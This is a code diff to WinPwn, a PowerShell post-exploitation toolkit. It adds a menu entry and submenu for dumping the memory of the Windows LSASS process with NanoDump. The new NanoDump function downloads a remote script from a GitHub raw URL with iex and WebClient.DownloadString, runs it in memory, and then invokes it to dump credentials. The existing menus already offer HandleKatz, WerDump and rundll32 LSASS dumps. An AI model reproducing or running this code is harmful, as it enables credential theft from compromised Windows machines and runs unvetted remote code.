@@ -661,7 +661,8 @@ __        ___       ____
             Write-Host -ForegroundColor Green '1. Use HandleKatz! '
             Write-Host -ForegroundColor Green '2. Use WerDump! '
             Write-Host -ForegroundColor Green '3. Dump lsass using rundll32 technique!'
-            Write-Host -ForegroundColor Green '4. Go back '
+            Write-Host -ForegroundColor Green '4. Dump lsass using NanoDump!'
+            Write-Host -ForegroundColor Green '5. Go back '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
             
@@ -670,10 +671,68 @@ __        ___       ____
                 1{if(isadmin){HandleKatz}}
                 2{if(isadmin){werDump}}
                 3{if(isadmin){Dumplsass}}
+                4{if(isadmin){NanoDumpChoose}}
              }
         }
-        While ($masterquestion -ne 4)
+        While ($masterquestion -ne 5)
 
+}
+
+function NanoDumpChoose
+{
+        do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> NanoDump Submenu
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Dump LSASS with a valid signature! '
+            Write-Host -ForegroundColor Green '2. Dump LSASS with an invalid signature, has to be restored afterwards (see NanoDump README)! '
+            Write-Host -ForegroundColor Green '3. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{if(isadmin){NanoDump -valid}}
+                2{if(isadmin){NanoDump}}
+            }
+        }
+        While ($masterquestion -ne 3)
+
+}
+
+function NanoDump
+{
+<#
+    .DESCRIPTION
+        Execute NanoDump Shellcode to dump lsass.
+        Main Credits to https://github.com/helpsystems/nanodump
+        Author: Fabian Mosch, Twitter: @ShitSecure
+    #>
+
+Param
+    (
+        [switch]
+        $valid
+)
+
+    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1')
+
+    if ($valid)
+    {
+        Invoke-NanoDump -valid
+    }
+    else
+    {
+        Invoke-NanoDump
+    }
 }
 
 function werDump
